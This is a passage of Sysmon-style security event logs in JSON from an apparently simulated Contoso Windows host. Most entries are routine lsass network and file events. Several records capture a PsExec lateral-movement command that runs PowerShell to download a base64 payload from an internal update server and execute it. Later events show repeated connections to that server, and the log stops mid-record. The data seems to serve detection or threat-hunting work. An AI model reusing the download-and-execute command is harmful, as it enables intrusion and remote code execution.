        {
            "action": "start",
            "count": 0,
            "dest_fqdn": "vm-198-51-100-0.eu-south-1.compute.example.com",
            "dest_hostname": "vm-198-51-100-0",
            "dest_ip": "198.51.100.0",
            "dest_ipv6": "false",
            "dest_port": 389,
            "event_id": "e341c867e5ae26c57eb449295173e12abf71cfa1e03d52ff040888212e50009b",
            "event_type": "flow",
            "event_utc": "2020-09-25T13:26:01.905Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "e341c867e5ae26c57eb449295173e12abf71cfa1e03d52ff040888212e50009b",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4105013",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.1",
            "src_ipv6": "false",
            "src_port": 55401,
            "subtype": "start",
            "time": "2020-09-25T13:25:51.218Z",
            "timestamp": 1601040351218,
            "transport": "udp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 0,
            "dest_fqdn": "srv-dc-73.contoso.org",
            "dest_hostname": "srv-dc-73",
            "dest_ip": "10.0.0.12",
            "dest_ipv6": "false",
            "dest_port": 88,
            "event_id": "c583bd7bf7c08b23f1c0625fdac97e4b4064a64ca34a50dbc56a6476ad019300",
            "event_type": "flow",
            "event_utc": "2020-09-25T13:34:48.675Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "c583bd7bf7c08b23f1c0625fdac97e4b4064a64ca34a50dbc56a6476ad019300",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4105172",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.2",
            "src_ipv6": "false",
            "src_port": 65008,
            "subtype": "start",
            "time": "2020-09-25T13:34:37.769Z",
            "timestamp": 1601040877769,
            "transport": "tcp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "b5645d5f187eca51aac5f359b846e550aa4093b6da830cb10ee4cc56435c3b44",
            "event_type": "file",
            "event_utc": "2020-09-25T13:35:44.847Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "b5645d5f187eca51aac5f359b846e550aa4093b6da830cb10ee4cc56435c3b44",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4105193",
            "subtype": "create",
            "time": "2020-09-25T13:35:44.852Z",
            "timestamp": 1601040944852,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "59d1cbdde27ca85cc73aa4fe70becc2034cc4facdcfb0c00614b10f53c043bbf",
            "event_type": "file",
            "event_utc": "2020-09-25T13:47:00.786Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "59d1cbdde27ca85cc73aa4fe70becc2034cc4facdcfb0c00614b10f53c043bbf",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4105348",
            "subtype": "create",
            "time": "2020-09-25T13:47:00.798Z",
            "timestamp": 1601041620798,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\cmd.exe /C C:\\Users\\Public\\PsExec64.exe  /accepteula \\\\cmp-447931 cmd /c powershell.exe -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content )))\"",
            "event_id": "fcb242f8aa1723fb7294f295654ccb6ff003cd7eef57d09940228cfe09bbda9c",
            "event_type": "process",
            "event_utc": "2020-09-25T14:16:27.959Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8FAFBE3C23E2BE4D6A3C063118B9A4F2",
                "SHA256": "4C3EA4C44AAB74350355C419826B8C9E6172C3BD8F0BB5817ECF7BE50B629051"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "fcb242f8aa1723fb7294f295654ccb6ff003cd7eef57d09940228cfe09bbda9c",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "Cmd.Exe",
            "parent_command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "pid": 1612,
            "ppid": 3544,
            "process_guid": "{DD483508-FBBB-5F6D-0000-0010C82F3805}",
            "record_number": "4108638",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-25T14:16:27.976Z",
            "timestamp": 1601043387976,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-FBBB-5F6D-0000-0010C82F3805}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\wow64.dll+14591|C:\\windows\\System32\\wow64.dll+13d83|C:\\windows\\System32\\wow64.dll+6523|C:\\windows\\System32\\wow64cpu.dll+1923|C:\\windows\\System32\\wow64.dll+1aefc|C:\\windows\\System32\\wow64.dll+bea0|C:\\windows\\SYSTEM32\\ntdll.dll+792b8|C:\\windows\\SYSTEM32\\ntdll.dll+78e3b|C:\\windows\\SYSTEM32\\ntdll.dll+78dee|C:\\windows\\SYSTEM32\\ntdll.dll+702fc(wow64)|C:\\windows\\System32\\KERNELBASE.dll+d3a96(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189dbb(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189a6c(wow64)|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win32.dll+31c2(wow64)|UNKNOWN(0000000071971000)|UNKNOWN(000000000C6064BB)|UNKNOWN(000000000C6065D3)|UNKNOWN(000000000C60672B)|UNKNOWN(000000000C601965)|UNKNOWN(000000000C601A87)|UNKNOWN(000000000C6071CC)|UNKNOWN(000000000C600506)|UNKNOWN(000000000C6078A8)",
            "event_id": "cf2128eccb4f1ea43bf873d1a03cc22cb68fa384e90c06a325cc82f70c80a1e8",
            "event_type": "process",
            "event_utc": "2020-09-25T14:16:27.974Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "cf2128eccb4f1ea43bf873d1a03cc22cb68fa384e90c06a325cc82f70c80a1e8",
            "image_path": "C:\\windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 1612,
            "process_guid": "{DD483508-FBBB-5F6D-0000-0010C82F3805}",
            "record_number": "4108639",
            "src_exe": "powershell.exe",
            "src_image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "src_pid": "3544",
            "src_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "subtype": "access",
            "time": "2020-09-25T14:16:27.977Z",
            "timestamp": 1601043387977,
            "uuid": "{DD483508-FBBB-5F6D-0000-0010C82F3805}"
        },
        {
            "action": "create",
            "command_line": "C:\\Users\\Public\\PsExec64.exe   /accepteula \\\\cmp-447931 cmd /c powershell.exe -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content )))\"",
            "event_id": "ea1bf2efd96190dc2c494da2b18243c884dd18561f5fc8813eaf08bdef18fc16",
            "event_type": "process",
            "event_utc": "2020-09-25T14:16:28.177Z",
            "exe": "PsExec64.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "9321C107D1F7E336CDA550A2BF049108",
                "SHA256": "AD6B98C01EE849874E4B4502C3D7853196F6044240D3271E4AB3FC6E3C08E9A4"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "ea1bf2efd96190dc2c494da2b18243c884dd18561f5fc8813eaf08bdef18fc16",
            "image_path": "C:\\Users\\Public\\PsExec64.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "psexec.c",
            "parent_command_line": "C:\\windows\\system32\\cmd.exe /C C:\\Users\\Public\\PsExec64.exe  /accepteula \\\\cmp-447931 cmd /c powershell.exe -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content )))\"",
            "parent_exe": "cmd.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "parent_process_guid": "{DD483508-FBBB-5F6D-0000-0010C82F3805}",
            "pid": 9616,
            "ppid": 1612,
            "process_guid": "{DD483508-FBBC-5F6D-0000-00100A4A3805}",
            "record_number": "4108640",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-25T14:16:28.184Z",
            "timestamp": 1601043388184,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-FBBC-5F6D-0000-00100A4A3805}"
        },
        {
            "action": "start",
            "count": 0,
            "dest_ip": "10.14.246.5",
            "dest_ipv6": "false",
            "dest_port": 135,
            "event_id": "24d96ffd23e4365a8e8f6c291630b3bab1b2794f0f6c79410ba5752db5de38a7",
            "event_type": "flow",
            "event_utc": "2020-09-25T14:16:40.751Z",
            "exe": "PsExec64.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "24d96ffd23e4365a8e8f6c291630b3bab1b2794f0f6c79410ba5752db5de38a7",
            "image_path": "C:\\Users\\Public\\PsExec64.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 9616,
            "process_guid": "{DD483508-FBBC-5F6D-0000-00100A4A3805}",
            "record_number": "4108651",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.2",
            "src_ipv6": "false",
            "src_port": 51950,
            "subtype": "start",
            "time": "2020-09-25T14:16:30.834Z",
            "timestamp": 1601043390834,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-FBBC-5F6D-0000-00100A4A3805}"
        },
        {
            "action": "start",
            "count": 0,
            "dest_ip": "10.14.246.5",
            "dest_ipv6": "false",
            "dest_port": 49693,
            "event_id": "7491f7e1736b00b23c04cc7b4231d1a003bb94098a32bbf5752e612886430cbf",
            "event_type": "flow",
            "event_utc": "2020-09-25T14:16:40.879Z",
            "exe": "PsExec64.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "7491f7e1736b00b23c04cc7b4231d1a003bb94098a32bbf5752e612886430cbf",
            "image_path": "C:\\Users\\Public\\PsExec64.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 9616,
            "process_guid": "{DD483508-FBBC-5F6D-0000-00100A4A3805}",
            "record_number": "4108652",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.2",
            "src_ipv6": "false",
            "src_port": 51951,
            "subtype": "start",
            "time": "2020-09-25T14:16:30.834Z",
            "timestamp": 1601043390834,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-FBBC-5F6D-0000-00100A4A3805}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "041bb1bfbc2c694bd10110bac8f1ee5b029a04131cfd7c02128dd1b20804618d",
            "event_type": "file",
            "event_utc": "2020-09-25T14:18:02.775Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "041bb1bfbc2c694bd10110bac8f1ee5b029a04131cfd7c02128dd1b20804618d",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4108956",
            "subtype": "create",
            "time": "2020-09-25T14:18:02.779Z",
            "timestamp": 1601043482779,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "1494a0963373fb20586593a687952ff75cd7e6b1cec5bc8aa97f5ae6f1940c27",
            "event_type": "file",
            "event_utc": "2020-09-25T14:49:02.678Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "1494a0963373fb20586593a687952ff75cd7e6b1cec5bc8aa97f5ae6f1940c27",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4115976",
            "subtype": "create",
            "time": "2020-09-25T14:49:02.681Z",
            "timestamp": 1601045342681,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 2,
            "dest_fqdn": "srv-dc-73.contoso.org",
            "dest_hostname": "srv-dc-73",
            "dest_ip": "10.0.0.12",
            "dest_ipv6": "false",
            "dest_port": 389,
            "event_id": "d315573a739b84153672d8671e26fd66340b679bfa98de6e07597855b9d8b8ed",
            "event_type": "flow",
            "event_utc": "2020-09-25T15:17:58.666Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "d315573a739b84153672d8671e26fd66340b679bfa98de6e07597855b9d8b8ed",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4122251",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.2",
            "src_ipv6": "false",
            "src_port": 49651,
            "subtype": "start",
            "time": "2020-09-25T15:17:49.424Z",
            "timestamp": 1601047069424,
            "transport": "udp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "2128861685f301272d0b57a111b5cd99cc5469b67d4b4caf6337aea05a09fd31",
            "event_type": "file",
            "event_utc": "2020-09-25T15:20:02.020Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "2128861685f301272d0b57a111b5cd99cc5469b67d4b4caf6337aea05a09fd31",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4122679",
            "subtype": "create",
            "time": "2020-09-25T15:20:02.034Z",
            "timestamp": 1601047202034,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 35,
            "dest_fqdn": "srv-dc-80.contoso.org",
            "dest_hostname": "srv-dc-80",
            "dest_ip": "10.0.0.6",
            "dest_ipv6": "false",
            "dest_port": 135,
            "event_id": "2eac45f9008382ebd82c3904889dda21ac878b044935a6eab3f2b64aa781a13c",
            "event_type": "flow",
            "event_utc": "2020-09-25T15:31:11.664Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "2eac45f9008382ebd82c3904889dda21ac878b044935a6eab3f2b64aa781a13c",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4124936",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.2",
            "src_ipv6": "false",
            "src_port": 51836,
            "subtype": "start",
            "time": "2020-09-25T15:31:03.412Z",
            "timestamp": 1601047863412,
            "transport": "tcp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 29,
            "dest_fqdn": "srv-dc-80.contoso.org",
            "dest_hostname": "srv-dc-80",
            "dest_ip": "10.0.0.6",
            "dest_ipv6": "false",
            "dest_port": 49668,
            "event_id": "2ca82490ab47ac4ecd77752f09e803597e1d7b4e6bc6087528d01dea38cc840d",
            "event_type": "flow",
            "event_utc": "2020-09-25T15:31:11.695Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "2ca82490ab47ac4ecd77752f09e803597e1d7b4e6bc6087528d01dea38cc840d",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4124938",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.2",
            "src_ipv6": "false",
            "src_port": 51838,
            "subtype": "start",
            "time": "2020-09-25T15:31:03.412Z",
            "timestamp": 1601047863412,
            "transport": "tcp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 2,
            "dest_fqdn": "srv-dc-34.contoso.org",
            "dest_hostname": "srv-dc-34",
            "dest_ip": "10.0.0.11",
            "dest_ipv6": "false",
            "dest_port": 389,
            "event_id": "b07a9a637e9136f791573fa481e4b848eceb4b61fa3a7776652613531df03811",
            "event_type": "flow",
            "event_utc": "2020-09-25T15:45:56.288Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "b07a9a637e9136f791573fa481e4b848eceb4b61fa3a7776652613531df03811",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4128518",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.2",
            "src_ipv6": "false",
            "src_port": 62453,
            "subtype": "start",
            "time": "2020-09-25T15:45:47.710Z",
            "timestamp": 1601048747710,
            "transport": "udp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "546869144e60206980196a4c5b70c8163b6b3ad56513e566919f658ee83b8944",
            "event_type": "file",
            "event_utc": "2020-09-25T15:51:01.641Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "546869144e60206980196a4c5b70c8163b6b3ad56513e566919f658ee83b8944",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4129756",
            "subtype": "create",
            "time": "2020-09-25T15:51:01.644Z",
            "timestamp": 1601049061644,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "e9b89e6b9a529738366fc58b322d6527681f3ee4667f0c69f0c8d8e6ea383e04",
            "event_type": "file",
            "event_utc": "2020-09-25T16:22:02.078Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "e9b89e6b9a529738366fc58b322d6527681f3ee4667f0c69f0c8d8e6ea383e04",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4136999",
            "subtype": "create",
            "time": "2020-09-25T16:22:02.088Z",
            "timestamp": 1601050922088,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 11,
            "dest_fqdn": "srv-dc-80.contoso.org",
            "dest_hostname": "srv-dc-80",
            "dest_ip": "10.0.0.6",
            "dest_ipv6": "false",
            "dest_port": 49674,
            "event_id": "3742eb081067555f02269b160d2bbc80f9dae461325d6b4c4138f002b046c9c0",
            "event_type": "flow",
            "event_utc": "2020-09-25T16:22:13.324Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "3742eb081067555f02269b160d2bbc80f9dae461325d6b4c4138f002b046c9c0",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4137010",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.2",
            "src_ipv6": "false",
            "src_port": 63822,
            "subtype": "start",
            "time": "2020-09-25T16:22:04.297Z",
            "timestamp": 1601050924297,
            "transport": "tcp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "576a4f196ea7515bc2b702fa4975ce4a470b32ff0d0c3890cfafad17101b997b",
            "event_type": "file",
            "event_utc": "2020-09-25T16:53:02.125Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "576a4f196ea7515bc2b702fa4975ce4a470b32ff0d0c3890cfafad17101b997b",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4144281",
            "subtype": "create",
            "time": "2020-09-25T16:53:02.130Z",
            "timestamp": 1601052782130,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 12,
            "dest_fqdn": "srv-dc-80.contoso.org",
            "dest_hostname": "srv-dc-80",
            "dest_ip": "10.0.0.6",
            "dest_ipv6": "false",
            "dest_port": 389,
            "event_id": "5d82baaa1de1a46c7a9804763bd01d06f7892697220ef412d3326758727135c1",
            "event_type": "flow",
            "event_utc": "2020-09-25T17:03:15.269Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "5d82baaa1de1a46c7a9804763bd01d06f7892697220ef412d3326758727135c1",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4146509",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.2",
            "src_ipv6": "false",
            "src_port": 62337,
            "subtype": "start",
            "time": "2020-09-25T17:03:06.092Z",
            "timestamp": 1601053386092,
            "transport": "udp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "25c3826fa6c3f80476dbddfe61364503d35f4c0440544a2812b5638c53be8b96",
            "event_type": "file",
            "event_utc": "2020-09-25T17:24:02.130Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "25c3826fa6c3f80476dbddfe61364503d35f4c0440544a2812b5638c53be8b96",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4151304",
            "subtype": "create",
            "time": "2020-09-25T17:24:02.143Z",
            "timestamp": 1601054642143,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 57091,
            "dest_fqdn": "srv-sft-update-38.contoso.org",
            "dest_hostname": "srv-sft-update-38",
            "dest_ip": "10.0.0.8",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "b5c4957cd0755c9188e38cfff0fcc839dbb1386d05fada93bf897cef7123a2ff",
            "event_type": "flow",
            "event_utc": "2020-09-25T17:25:25.689Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "b5c4957cd0755c9188e38cfff0fcc839dbb1386d05fada93bf897cef7123a2ff",
            "image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 3544,
            "process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "record_number": "4151595",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.2",
            "src_ipv6": "false",
            "src_port": 61902,
            "subtype": "start",
            "time": "2020-09-25T17:25:15.633Z",
            "timestamp": 1601054715633,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-E26C-5F6C-0000-0010E0300501}"
        },
        {
            "action": "start",
            "count": 3138,
            "dest_fqdn": "srv-sft-update-38.contoso.org",
            "dest_hostname": "srv-sft-update-38",
            "dest_ip": "10.0.0.8",
            "dest_ipv6": "false",
            "dest_port": 443,
            "event_id": "34c288f759026e6b8b9254caf640fe65cde8a2f23e21a345053b69589c3cbbf5",
